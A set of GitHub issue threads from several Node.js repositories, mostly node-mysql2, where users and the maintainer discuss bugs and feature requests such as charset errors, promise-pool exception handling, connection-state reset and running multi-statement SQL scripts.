  <Issue_435>
    <Repository>melbnodejs</Repository>
    <Title>from poll: overview of popular npm modules</Title>
    <Owner>sidorares</Owner>
    <Body>"I will like to hear about popular modules people are using for production apps. Beyond the usual Async, request and Express."
- I'd probably make it 20% time overview what is on npm and 80% time "what search tools are available? What metrics are good to decide which package to use when there are 10 of them with similar functionality?"

http://stackoverflow.com/questions/10568512/how-to-find-search-find-npm-packages

Maybe quick workshop on "how to make chunk of my JS code worth publishing and upload to npm" could fit this talk (or complement it as a second talk)
</Body>
    <State>open</State>
    <Comment>
      <Owner>rkstedman</Owner>
      <Body>Talk could also compare publishing private vs public npm modules
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>@rkstedman "publishing private" == "using git repo (branch,tag) as npm dependency"?
</Body>
    </Comment>
    <Comment>
      <Owner>rkstedman</Owner>
      <Body>@sidorares That is definitely one way to do it, but I was thinking of the alternative method of deploying a private npm registry to enable sharing and use of the private modules within a team, without registering them to the global npmjs.org. Using this method, as opposed to a git repo, also allows a company to provide governance around use of public npm module versions to ensure stability and perform audits of modules in use. StrongLoop blogged about using node-reggis for this purpose: http://blog.strongloop.com/deploy-a-private-npm-registry-without-couchdb-or-redis/
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>Yes, I'm interested in "private npm registry" talk. Don't have any experience myself. We had local npm registry at campjs, I think @eugenware knows well how to install/configure one
</Body>
    </Comment>
    <Comment>
      <Owner>jbernsie</Owner>
      <Body>would be a very interesting talk :+1: 
</Body>
    </Comment>
  </Issue_435>
  <Issue_436>
    <Repository>mysql-osquery-proxy</Repository>
    <Title>A error happen when add a new table to osquery</Title>
    <Owner>sidorares</Owner>
    <Body>@sidorares 

```
I add a new table to osquery and recompile osqueryi, when I only use osqueryi(client), it can work, but when I use mysql-osquery-proxy, it does not work, did I miss some steps ? I already replace osqueryi to new version
```

**osqueryi:**
Using a virtual database. Need help, type '.help'
osquery&gt; select \* from fio;
+--------------------------+----------------------+---------------+------------+------------+-------------+------------+-----------+------+
| fio_product              | part_number          | serial_number | fm_version | dr_version | rsvd_status | rated_prbw | cur_tempr | size |
+--------------------------+----------------------+---------------+------------+------------+-------------+------------+-----------+------+
| xxxx | xxx |xxx     | 7.1.17     | 3.2.14     | Healthy     | 2,57.39    | 53.15     | 410  |
+--------------------------+----------------------+---------------+------------+------------+-------------+------------+-----------+------+

**use mysql-osquery-proxy:**
ERROR 1064 (_____): Error running query: no such table: fio
</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>hm, `Error running query: no such table: fio` is answer from osquery itself, maybe there is some action required so that clients aware about new tables? Are you able to see "standard" built-in tables?
</Body>
    </Comment>
    <Comment>
      <Owner>foreversunyao</Owner>
      <Body>@sidorares 
    Yes , we can see table fio by .table command, dose mysql-osquery-proxy support the new table added to base osquery version? or is there any example ?

```
Using a virtual database. Need help, type '.help'
```

osquery&gt; .tables
  =&gt; acpi_tables
  =&gt; apt_sources
  =&gt; arp_cache
  =&gt; authorized_keys
  =&gt; block_devices
  =&gt; carbon_black_info
  =&gt; chrome_extensions
  =&gt; cpu_time
  =&gt; cpuid
  =&gt; crontab
  =&gt; deb_packages
  =&gt; device_file
  =&gt; device_hash
  =&gt; device_partitions
  =&gt; disk_encryption
  =&gt; dns_resolvers
  =&gt; etc_hosts
  =&gt; etc_protocols
  =&gt; etc_services
  =&gt; file
  =&gt; file_events

## **=&gt; fio**
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>not sure, this module basically talks osquery using thrift protocol ( [.query method](https://github.com/facebook/osquery/blob/60bbf129af9dc3742fb24689746d74c4fc73660d/osquery.thrift#L89-L91) ) on one side and exposes as mysql server on another side
</Body>
    </Comment>
  </Issue_436>
  <Issue_437>
    <Repository>node-gday</Repository>
    <Title>Service advertise</Title>
    <Owner>sidorares</Owner>
    <Body>Would it be possible with the same library to advertise a service ?</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>probably yes, but need to find what's dbus api for that. &#13;
&#13;
https://linux.die.net/man/1/avahi-publish-service&#13;
&#13;
Prob easiest way is to use `avahi-publish`  while running `dbus-monitor`</Body>
    </Comment>
  </Issue_437>
  <Issue_438>
    <Repository>node-harfbuzz</Repository>
    <Title>Example crashes</Title>
    <Owner>sidorares</Owner>
    <Body>The example in the README crashes. The `freetype` package does not expose a `handle` property on its `face` object, so the call `var glyphs = hb(face.handle, "This is test text to shape");` passes an `undefined` to the native addon, triggering a crash.&#13;
&#13;
There is already a PR open for a better integration with the `freetype` package, but HarfBuzz is capable of OpenType font parsing on its own, which is all `freetype` seems to be used for. I don't know that it makes sense to take on an additional native dependency to do something that HarfBuzz itself can already do.&#13;
&#13;
[My PR](#2) removes the dependency on `freetype` and fixes the crash. The API changed, the module is no longer a function, instead its an object with a `shape` and  `createFont` functions.</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>This repo was mainly PoC for complex scripts support for https://github.com/sidorares/ntk&#13;
ntk also needs freetype to rasterize font and upload glyphs to X server, Ideally I want harfbuzz warapper that would allow to pass code to get glyph metrics via js callback to avoid double loading of the font. Do think this is easy to achieve?&#13;
&#13;
At the same time, for other users what you propose is probably much easier to use (no need to create freetype font and pass it manually)</Body>
    </Comment>
    <Comment>
      <Owner>nasser</Owner>
      <Body>That's a reasonable use case. Ideally, we'd be able to do it without taking on freetype as a dependency, and specifically without making the C++ of this library depend on the C++ of the freetype library. If the freetype library exposed a `handle` property like in your example, then all we'd have to do is expose the harfbuzz freetype functions and pass in the freetype handle from JavaScript. I wonder what @ericfreese thinks about that.</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>What I also want to keep as an option - if for example I start using wasm version of freetype it should be still compatible with harfbuzz module. From my understanding harfbuzz does not care about actual curves in the glyphs, just certain boxes metrics and some extra tables in the font, and I'd really like to pass that explicitly (or have two apis "high level" and "low level" where everything is manual and controlled)</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>Also really keen to try emscripten compiled harfbuzz as well</Body>
    </Comment>
    <Comment>
      <Owner>khaledhosny</Owner>
      <Body>HarfBuzz has callback font functions, exposing this in this module would allow using any implementation that can provide these callback functions, without making it a hard dependency. The default should the internal HarfBuzz ones.</Body>
    </Comment>
  </Issue_438>
  <Issue_439>
    <Repository>node-i3</Repository>
    <Title>I3IpcClient "connect" emit order is corrected.</Title>
    <Owner>sidorares</Owner>
    <Body>I3IpcClient "connect" event emit is placed after "self._stream" assign.</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>why this was a problem? Does any code outside relies on `._stream` being set?</Body>
    </Comment>
    <Comment>
      <Owner>ndvtr</Owner>
      <Body>yes, you are right, `._stream` from the outside is not very good, but I needed for example a `._stream.destroy()`</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>can you elaborate why? Maybe we need to add public api for that?</Body>
    </Comment>
    <Comment>
      <Owner>ndvtr</Owner>
      <Body>Close/destroy socket connection after a timeout: I'm waiting a window event but not longer than 30 seconds or another logic, for example.&#13;
Yes, `.destroy()` would be nice:&#13;
```&#13;
@@ -178,0 +179,5 @@ I3IpcClient.prototype.on = function(event, handler) {&#13;
+I3IpcClient.prototype.destroy = function() {&#13;
+  if (!this._stream) return;&#13;
+  this._stream.destroy();&#13;
+}&#13;
&#13;
```&#13;
</Body>
    </Comment>
  </Issue_439>
  <Issue_440>
    <Repository>node-mysql2</Repository>
    <Title>PromiseCon#query does not affect the mysql database</Title>
    <Owner>sidorares</Owner>
    <Body>I'm facing an issue, when i run a mysql query it does not affect the database and it don't error</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>please show your code</Body>
    </Comment>
  </Issue_440>
  <Issue_441>
    <Repository>node-mysql2</Repository>
    <Title>Fix #967 - Return a string for '00:00:00' time</Title>
    <Owner>sidorares</Owner>
    <Body>The method `readTimeString` returns a string in all other cases, so it should return `00:00:00`&#13;
&#13;
Fixes: #967 </Body>
    <State>open</State>
    <Comment>
      <Owner>williamdes</Owner>
      <Body>@sidorares Can you please review this very small PR ? ;)</Body>
    </Comment>
  </Issue_441>
  <Issue_442>
    <Repository>node-mysql2</Repository>
    <Title>Allow to pass secureProtocol or minVersion to ssl options</Title>
    <Owner>sidorares</Owner>
    <Body>Node 12.1.0 defaults to tls version 1.2 and mysql 5.7 on ubuntu 18.04 uses tls 1.1, so to be able to connect I need to run node with --tls-min-v1.1 option.&#13;
&#13;
I would like to be able to set the tls version with the secureProtocol or minVersion options that are received by Tls.createSecureContext so I don't have to run node with --tls-min-v1.1.</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>We need to add extra option here - https://github.com/sidorares/node-mysql2/blob/58c1056edd21ad42e2e755959b75f76b502e3f72/lib/connection.js#L299-L305&#13;
&#13;
Do you want to volunteer to do that @xrnoz ?</Body>
    </Comment>
  </Issue_442>
  <Issue_443>
    <Repository>node-mysql2</Repository>
    <Title>Fake then and catch functions on non-promise classes break duck typing</Title>
    <Owner>sidorares</Owner>
    <Body>The non-promise version of `Query` defines fake [`then`](https://github.com/sidorares/node-mysql2/blob/master/lib/commands/query.js#L36) and [`catch`](https://github.com/sidorares/node-mysql2/blob/master/lib/commands/query.js#L273) functions that do nothing more than throwing an error with additional information about using the promise wrapper.&#13;
This works great for catching these kind of mistakes but it prevents the use of duck-typing to differentiate between promise- and non-promise api's.&#13;
&#13;
The library I'm trying to use uses this check to test if an implementation is promise-based:&#13;
```js&#13;
// '_' provided by the underscore module&#13;
if (promise &amp;&amp; _.isFunction(promise.then) &amp;&amp; _.isFunction(promise.catch)) {&#13;
 // Probably a promise.&#13;
 promise.then(function() {&#13;
  done(null);&#13;
 }).catch(function(error) {&#13;
  done(error);&#13;
 });&#13;
}&#13;
```&#13;
The non-promise implementation of `Query` passes this test because it defines these two functions. However, these methods do nothing more than throwing an error, which isn't particularly useful in this case.&#13;
&#13;
I suggest removing these 'fake' methods to re-enable duck typing. I feel like the absence of `then` and `catch` when using them would be a clear enough sign to the user that the API they're using is not promise based. The process of using the API that *is* promise based is clearly documented, I don't think people will have trouble finding it. Additionally, I feel like it's just not the best practice to define a function whose only purpose is to notify the user that they shouldn't be using it, especially if that function is characteristic for a certain type of class.</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>&gt; I feel like the absence of then and catch when using them would be a clear enough sign to the user that the API they're using is not promise based.&#13;
&#13;
This was added primarily to help users that try to do `await connection.query()` on non-promise version of connection ( this is easy to do by mistake and a lot of people actually do ). In that case problem is actually quite delayed and can be difficult to notice&#13;
&#13;
Can you elaborate more what your use case is?</Body>
    </Comment>
    <Comment>
      <Owner>HoldYourWaffle</Owner>
      <Body>I never tried to `await` a non-promise return value, but from what I can tell by a quick google search is that it should(?) behave pretty normal. As I said, never tried it, it could do weird stuff.&#13;
&#13;
To elaborate on my use case: I'm working with an API that supports both promise and non-promise connections. It uses the aforementioned test to check which category it's dealing with and takes action accordingly.&#13;
&#13;
Maybe an alternative solution could be to only define the `then` function. This way users will still get a heads-up if they mistakenly use `await`, but since the `catch` function is missing it won't pass the duck-typing test.</Body>
    </Comment>
  </Issue_443>
  <Issue_444>
    <Repository>node-mysql2</Repository>
    <Title>Cast of data when retrieving a single value in JSON.</Title>
    <Owner>sidorares</Owner>
    <Body>Hi,&#13;
&#13;
I'm fairly new to the using of JSON columns/this library, and I have some questions.&#13;
&#13;
My data are stored like that in my 'jsoncol': &#13;
```&#13;
{&#13;
"key1": "value1", &#13;
"key2": 10&#13;
}&#13;
```&#13;
&#13;
If I query the json col directly (select jsoncol from jsontable;) it gets the entire object with the good type no problem.&#13;
&#13;
But what if I want to retrieve only "key2", while using the "simple" MySQL syntaxe :&#13;
&#13;
&gt; SELECT `jsoncol`-&gt;&gt;'$.key2' FROM `jsontable` AS `jsontable`;&#13;
&#13;
it fails and return "key2" value as a string : "10"&#13;
&#13;
whereas while using JSON_EXTRACT : &#13;
&#13;
&gt; SELECT JSON_EXTRACT(`jsoncol`, '$.key2') AS `jsoncol.key2` FROM `jsontable` AS `jsontable`;&#13;
&#13;
it is returned as a number.&#13;
&#13;
My question is : is this normal? Do I have to use JSON_EXTRACT to get a single key with the good type? I'm using the **query** method, is it better to use **execute**?&#13;
&#13;
</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>&gt; My question is : is this normal?&#13;
&#13;
default type casting is based on what column type is returned for that field. I don't have much experience with JSON sql syntax, but it looks like for `SELECT jsoncol-&gt;&gt;'$.key2' FROM jsontable AS jsontable` query mysql returns string type. Can you run this with `debug: true` flag and paste log?&#13;
&#13;
&gt; is it better to use execute?&#13;
&#13;
it depends, also result type might be different. With `.query()` simple types always transmitted as string over the wire and `.execute()` results are binary but driver tries to cast same mysql types to same corresponding JS types</Body>
    </Comment>
    <Comment>
      <Owner>Xenope</Owner>
      <Body>Here is the debug output : &#13;
&#13;
```&#13;
[....]&#13;
1 11540 ==&gt; Query#unknown name(2,,38)&#13;
        Column definition:&#13;
          name: jsoncol.key2&#13;
          type: 251&#13;
         flags: 128&#13;
&#13;
&#13;
Compiled text protocol row parser:&#13;
(function () {&#13;
  return function TextRow(packet, fields, options, CharsetToEncoding) {&#13;
    const wrap = function wrap(field, type, packet, encoding) {&#13;
      return {&#13;
        type: type,&#13;
        length: field.columnLength,&#13;
        db: field.schema,&#13;
        table: field.table,&#13;
        name: field.name,&#13;
        string: function() {&#13;
          return packet.readLengthCodedString(encoding);&#13;
        },&#13;
        buffer: function() {&#13;
          return packet.readLengthCodedBuffer();&#13;
        },&#13;
        geometry: function() {&#13;
          return packet.parseGeometryValue();&#13;
        }&#13;
      };&#13;
    }&#13;
    // "jsoncol.key2": LONG_BLOB&#13;
    this["jsoncol.key2"] = options.typeCast(wrap(fields[0], "LONG_BLOB", packet, CharsetToEncoding[fields[0].characterSet]), function() { return packet.readLengthCodedString(CharsetToEncoding[fields[0].characterSet]);})&#13;
  };&#13;
})()&#13;
 raw: fe0000220003000004&#13;
[....]&#13;
```</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>So the type returned is "LONG_BLOB". Driver decodes and stores it as JS string.&#13;
&#13;
I'm not exactly sure why mysql server is not smart enough to send it as number, bettar ask someone with good mysql+json knowledge</Body>
    </Comment>
    <Comment>
      <Owner>Xenope</Owner>
      <Body>MMM weird, it really is a JSON column :p.&#13;
&#13;
I'll wait with you, in the meantime I'm gonna use JSON_EXTRACT.</Body>
    </Comment>
  </Issue_444>
  <Issue_445>
    <Repository>node-mysql2</Repository>
    <Title>There is an intention to make an official @types for the API?</Title>
    <Owner>sidorares</Owner>
    <Body>Nowadays TypeScript is a very popular way to write robust JavaScript, I am an adept of this superset and am in a project that needs to connect to MySQL.&#13;
&#13;
Going straight to the point:&#13;
1 - exsite an official @types npm for mysql2, which does not use the old typings?&#13;
2 - is there intention of creation?</Body>
    <State>open</State>
    <Comment>
      <Owner>drachehavoc</Owner>
      <Body>I found this types [https://github.com/types/mysql2](https://github.com/types/mysql2), but the npm install is not working properly, so I manually downloaded it and added it to my project.&#13;
&#13;
It would be nice if the command `npm i --save-dev @type/mysql2` work</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>Hi @drachehavoc , yes agree with you, would be good to improve typescript experience with node-mysql2&#13;
Would you be able to help with this? </Body>
    </Comment>
    <Comment>
      <Owner>drachehavoc</Owner>
      <Body>Sure! I will write some d.ts and share with you in next days.&#13;
&#13;
I will be happy to help. ^^</Body>
    </Comment>
  </Issue_445>
  <Issue_446>
    <Repository>node-mysql2</Repository>
    <Title>There might be a conversion from UTF to ASCII behind the scenes that generates incorrect values</Title>
    <Owner>sidorares</Owner>
    <Body>As explained [in this ticket](https://github.com/tgriesser/knex/issues/3135), I'm trying to insert a row with the string "kicke&#769;-accent.wav".&#13;
&#13;
My table uses the "latin1_swedish_ci" collation and that seems juste fine, as I am able to insert the row without a problem using the MySQL Workbench.&#13;
&#13;
However, when attempting to create the row with mysql2, I get the following error:&#13;
&#13;
    Error: Incorrect string value: '\xCC\x81-acc...' for column 'name' at row 1&#13;
    at PromiseConnection.query (.../node_modules/mysql2/promise.js:92:22)&#13;
&#13;
The code that inserts the row looks like this:&#13;
&#13;
    await db.query('INSERT INTO files SET ?', [{ extension: 'wav', name: 'kicke&#769;-accent.wav', user_id: 3706 }]);&#13;
&#13;
What is going on under the hood that prevents me from inserting a row just like I would do manually using the MySQL Workbench?&#13;
&#13;
Cheers!</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>This could be actually an issue with sqlstring module doing escape in input. While I'm checking this, could you try to do query using `.execute()` ? ( everything else being the same )</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>can you show `files` schema? Trying to prepare fully self contained example to reproduce the issue</Body>
    </Comment>
    <Comment>
      <Owner>maximedupre</Owner>
      <Body>Hey, thanks for helping. I tried the query with `.execute()` and the error is the same (I had to change the syntax a bit, because `SET ?` doesn't work with `.execute()`, you need to unpack the object values like: `SET column1=?, column2=?, ...`).&#13;
&#13;
`files` schema:&#13;
&#13;
&#13;
 CREATE TABLE `files` (&#13;
 `id` int(10) unsigned NOT NULL AUTO_INCREMENT,&#13;
 `project_id` int(10) unsigned NOT NULL,&#13;
 `user_id` int(10) unsigned NOT NULL,&#13;
 `name` varchar(200) NOT NULL,&#13;
 `extension` varchar(50) NOT NULL,&#13;
 `size` int(10) unsigned NOT NULL,&#13;
 `creation_date` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,&#13;
 PRIMARY KEY (`id`),&#13;
 KEY `files_project_id_foreign` (`project_id`),&#13;
 CONSTRAINT `files_project_id_foreign` FOREIGN KEY (`project_id`) REFERENCES `projects` (`id`)&#13;
 ) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=latin1&#13;
&#13;
&#13;
**EDIT**&#13;
&#13;
Here is the specific error:&#13;
&#13;
 {&#13;
  "message": "Incorrect string value: '\\xCC\\x81-acc...' for column 'name' at row 1",&#13;
  "code": "ER_TRUNCATED_WRONG_VALUE_FOR_FIELD",&#13;
  "errno": 1366,&#13;
  "sqlState": "HY000",&#13;
  "sqlMessage": "Incorrect string value: '\\xCC\\x81-acc...' for column 'name' at row 1"&#13;
 }</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>@maximedupre add `charset: 'LATIN1_SWEDISH_CI'` to connection options&#13;
&#13;
This is what I think happens:&#13;
Default connection encoding server decides to use is 'utf8' ( which in mysql not a real UTF-8 but something that was invented before utf8 was standartised ). "e&#769;" is surrogate pair on JS side which I believe mysql "utf8" can't understand&#13;
&#13;
```js&#13;
&gt; "e&#769;".codePointAt(0)&#13;
101&#13;
&gt; "e&#769;".codePointAt(1)&#13;
769&#13;
&gt;&#13;
```&#13;
&#13;
( might be wrong in explanation, correct me if you have better one )&#13;
&#13;
Also `charset: 'UTF8MB4_UNICODE_CI'` should work as well ( UTF8MB4 is "real" utf-8 while "UTF8" in mysql is cesu-8 - https://en.wikipedia.org/wiki/CESU-8 ). I'm sure your Workbench connects using UTF8MB4_UNICODE_CI</Body>
    </Comment>
    <Comment>
      <Owner>maximedupre</Owner>
      <Body>I tried with `charset: 'LATIN1_SWEDISH_CI'` and there is no more error, but the string is saved without accent in the DB ("kicke -accent.wav" instead of "kicke&#769;-accent.wav").&#13;
&#13;
`charset: 'UTF8MB4_UNICODE_CI'` causes the same error as when no charset is specified in the connection options.&#13;
&#13;
**EDIT**&#13;
&#13;
Btw, I have a different result when checking the code point for the "&#233;":&#13;
&#13;
    &gt; "&#233;".codePointAt(0);&#13;
    233&#13;
    &gt; "&#233;".codePointAt(1);&#13;
    undefined&#13;
&#13;
233 actually maps to the "&#233;" in the [latin1 charset](https://en.wikipedia.org/wiki/ISO/IEC_8859-1#Code_page_layout) and the [unicode charset](https://en.wikipedia.org/wiki/List_of_Unicode_characters#Latin-1_Supplement)&#13;
&#13;
**EDIT 2**&#13;
&#13;
Oh wow, apparently there's a difference between "e&#769;" and "&#233;" (try them in your node REPL). The same letter but encoded differently? Now that's confusing.&#13;
&#13;
**EDIT 3**&#13;
Made it work with `charset: 'UTF8MB4'` as opposed to `charset: 'UTF8MB4_UNICODE_CI'`. You might wanna add a warning or error message when passing in an invalid charset. Right now, nothing happens, which can lead to a lot of confusion as you can see ^^. I'll leave this ticket open for this reason, but close it if you wish to handle the warnings separately.&#13;
&#13;
**EDIT 4**&#13;
Actually, using the `charset: 'UTF8MB4'` connection option doesn't solve the problem, unless you create the schema using the connection, in which case the table will have a `UTF8MB4_GENERAL_CI` charset by default instead of a `LATIN1_SWEDISH_CI` charset&#13;
&#13;
**EDIT 5**&#13;
Ended up converting the collation and charset of my DB and all it's tables to `utf8mb4_unicode_ci` and now everything works fine. UTF8 is a better, modern choice anyway according to all the research I did.</Body>
    </Comment>
  </Issue_446>
  <Issue_447>
    <Repository>node-mysql2</Repository>
    <Title>Remove callback layer to catch sync connection exceptions</Title>
    <Owner>sidorares</Owner>
    <Body>This PR restructures PromisePool's `query` and `execute` so they catch synchronous exceptions.&#13;
&#13;
I don't think `Connection.query` actually throws synchronous exceptions, so we could remove the changes to support `PromisePool.query`, but I felt that would be going only half way.  Why doesn't `Connection.query` throw exceptions like `Connection.execute`?&#13;
&#13;
Alternative to #931 </Body>
    <State>open</State>
    <Comment>
      <Owner>jafl</Owner>
      <Body>I tried merging the latest from master, but the precommit hook does a major reformatting job.  This happens even when I pull a clean copy without any pre-existing node_modules directory.  How can I get around this?</Body>
    </Comment>
  </Issue_447>
  <Issue_448>
    <Repository>node-mysql2</Repository>
    <Title>Connection state is not reset on return to pool</Title>
    <Owner>sidorares</Owner>
    <Body>Per comment on https://github.com/sidorares/node-mysql2/issues/925#issuecomment-471101203&#13;
&#13;
This library does not reset the state of a connection returned to the pool before it is reused.&#13;
&#13;
This means if any operation mutates state of the connection such as session level variables/isolation level, or begins a transaction without committing or rolling back, the new connection request is given a dirty connection object.&#13;
&#13;
This can lead to rather extreme bugs.&#13;
&#13;
to resolve this, the library needs to follow the industry standard practice of issuing a connection.changeUser() with the same user the connection was opened with, ensuring that the state is all reset.&#13;
&#13;
I would suggest doing this on connection release rather than connection acquire so that obtaining a connection can be faster.</Body>
    <State>open</State>
    <Comment>
      <Owner>aikar</Owner>
      <Body>I noticed mysqljs/mysql does have some code to change user: https://github.com/mysqljs/mysql/blob/master/lib/Pool.js#L81&#13;
&#13;
However that code also suffers the same problem as it's a conditional changeUser only if the previous user of the connection changed user.</Body>
    </Comment>
  </Issue_448>
  <Issue_449>
    <Repository>node-mysql2</Repository>
    <Title>Connection.execute() must honor callback</Title>
    <Owner>sidorares</Owner>
    <Body>If there is a callback provided to Connection.execute(), do not throw any exceptions.</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>can you give a bit more context about the issue you solving? Also need a unit test</Body>
    </Comment>
    <Comment>
      <Owner>aikar</Owner>
      <Body>:-1: from me. this is validation logic of the call. The callback should only be called with an error from the server itself.&#13;
&#13;
It should throw an error on the call and break the caller so they can't ignore that error.&#13;
&#13;
This would mix scope of what the error in the callback is in relation to.</Body>
    </Comment>
    <Comment>
      <Owner>jafl</Owner>
      <Body>My reason for suggesting this patch was that, when using the promise api, there doesn't seem to be any way to catch the exceptions.  If you know of a way to do that, please let me know!</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>&gt; If you know of a way to do that, please let me know!&#13;
&#13;
with async/await&#13;
&#13;
```js&#13;
try {&#13;
  const result = await connection.execute(sql, parameters);&#13;
}&#13;
catch(error) {&#13;
   handle(error);&#13;
}&#13;
```</Body>
    </Comment>
    <Comment>
      <Owner>jafl</Owner>
      <Body>OK, I see my problem.  I was expecting all exceptions to go through the Promise, but the validation exceptions don't.  Thanks!</Body>
    </Comment>
    <Comment>
      <Owner>jafl</Owner>
      <Body>There is still a problem.  When I use a pool instead of a connection:&#13;
&#13;
```&#13;
try {&#13;
  const result = await pool.execute(sql, parameters);&#13;
}&#13;
catch(error) {&#13;
   handle(error);&#13;
}&#13;
```&#13;
&#13;
the error is not caught.  Instead, I get the following stack trace:&#13;
&#13;
```&#13;
.../node_modules/mysql2/lib/connection.js:616&#13;
          throw new TypeError(&#13;
          ^&#13;
&#13;
TypeError: Bind parameters must not contain undefined. To pass SQL NULL specify JS null&#13;
    at options.values.forEach.val (.../node_modules/mysql2/lib/connection.js:616:17)&#13;
    at Array.forEach (&lt;anonymous&gt;)&#13;
    at PoolConnection.execute (.../node_modules/mysql2/lib/connection.js:608:22)&#13;
    at getConnection (.../node_modules/mysql2/lib/pool.js:163:31)&#13;
    at process.nextTick (.../node_modules/mysql2/lib/pool.js:44:37)&#13;
    at processTicksAndRejections (internal/process/next_tick.js:74:9)&#13;
```</Body>
    </Comment>
    <Comment>
      <Owner>aikar</Owner>
      <Body>this error is by design not supposed to be 'caught'. It SHOULD crash your app, as this is a developer error informing you of a bug in your code to fix.&#13;
&#13;
This is not the type of error you should be trying to catch.</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>try / catch with await should be able to catch both sync and async errors </Body>
    </Comment>
    <Comment>
      <Owner>jafl</Owner>
      <Body>@aikar - During development, yes, I agree. However, in production, it is NEVER acceptable to crash under any circumstance. The app should log it and keep running.&#13;
&#13;
@sidorares - try/catch does normally catch all exceptions, but in this particular case, using a promise pool, it somehow doesn't. Please try it and let me know if you can reproduce it.</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>@jafl you are right, promise wrapper is not able to catch and reject that error, this needs to be fixed</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>so what your PR does is routing this error to a standard "error first" callback way instead of sync throw&#13;
I'm partially agree with @aikar in that we need to assist in locating this types of errors early in the code but at the same time having an error that is absolutely not possible to intercept is not good as well</Body>
    </Comment>
    <Comment>
      <Owner>jafl</Owner>
      <Body>Yes, it's a very interesting edge case. I will try to figure out the underlying cause. Hopefully, that will show us a way to fix it without using the callback method.</Body>
    </Comment>
    <Comment>
      <Owner>jafl</Owner>
      <Body>As an aside, can you explain why `undefined` is not treated the same as `null`?  It seems that the original mysql module does this.  I feel that `undefined` and `nulll` both mean the same thing, "no value," and the database should be making the decision on whether or not an empty value is allowed.</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>&gt; an you explain why undefined is not treated the same as null&#13;
&#13;
for me personally two reasons:&#13;
- mysql itself does not have "undefined" type&#13;
- I want to prevent users from accidentally sending NULL when it's in fact missing or uninitialised parameter&#13;
&#13;
I can see convenience of treating undefined same as null but imo reasons above outweigh benefits. Maybe it's better to judge if we have few simple real life scenarios </Body>
    </Comment>
    <Comment>
      <Owner>aikar</Owner>
      <Body>I believe I was involved with the undefined as an error change as I know that hit me in that I had a bug in my application that shouldn't of been sending undefined, that the error would have caught.&#13;
&#13;
</Body>
    </Comment>
    <Comment>
      <Owner>jafl</Owner>
      <Body>@aikar The database didn't complain about the "undefined" value, generating an error that the value was not allowed to be null?</Body>
    </Comment>
    <Comment>
      <Owner>jafl</Owner>
      <Body>I think I figured it out. The summary is that the "extra" layer of callback introduced by the pool breaks the connection between the promise and the code in `connection.execute` that throws the exception.&#13;
&#13;
My understanding is that the promise creates an execution stack, but that is finished once the pool registers the callback for a connection and returns.  When the connection is available, a separate execution stack is created, and this is what gets unwound when the exception is thrown inside `connection.execute`.  (Normally, `await` simply pauses the execution stack, so exceptions can unwind it.)&#13;
&#13;
I will investigate if using `PromiseConnecton` inside `PromisePool` can work around this.</Body>
    </Comment>
  </Issue_449>
  <Issue_450>
    <Repository>node-mysql2</Repository>
    <Title>Is there a way to run multiple statements/transaction/a sql script ?</Title>
    <Owner>sidorares</Owner>
    <Body>I know according to the protocol mysql only accept one statement a time.&#13;
&#13;
But is there a way to work around it ?&#13;
I tried&#13;
```js&#13;
for(const q of script.split(';')) {&#13;
    await pool.query(q);&#13;
}&#13;
````&#13;
&#13;
It usually works until I encountered sth. like&#13;
```sql&#13;
delimiter $$&#13;
create procedure foo&#13;
begin&#13;
select........;&#13;
end $$&#13;
delimiter ;&#13;
````&#13;
&#13;
So, do I really need to find a way to handle this ?</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>At protocol level it's "only one command at a time" and query command can contain multiple statements - see https://github.com/mysqljs/mysql#multiple-statement-queries</Body>
    </Comment>
    <Comment>
      <Owner>yw662</Owner>
      <Body>but the tricky thing is, that flag does not work when the delimiter change :-)</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>In your case it's one single statement, and you don't need to set delimiter. See example here - https://github.com/sidorares/node-mysql2/blob/0c422dd9d88a211015ddf4fcc8531048de9b1340/test/integration/connection/test-binary-multiple-results.js#L100-L104</Body>
    </Comment>
    <Comment>
      <Owner>yw662</Owner>
      <Body>But what if I read it from a sql script ?&#13;
sth like&#13;
```sql&#13;
drop table if exists foo&#13;
create table foo (&#13;
......&#13;
&#13;
drop procedure if exists bar;&#13;
delimiter $$&#13;
create procedure bar&#13;
(......&#13;
begin&#13;
-- a lot of statements --&#13;
end $$&#13;
delimiter ;&#13;
````</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>afaik you just use part without delimiter:&#13;
&#13;
```js&#13;
conn.query('drop procedure if exists bar');&#13;
conn.query(`&#13;
create procedure bar&#13;
(......&#13;
begin&#13;
-- a lot of statements --&#13;
end&#13;
`);&#13;
```</Body>
    </Comment>
  </Issue_450>
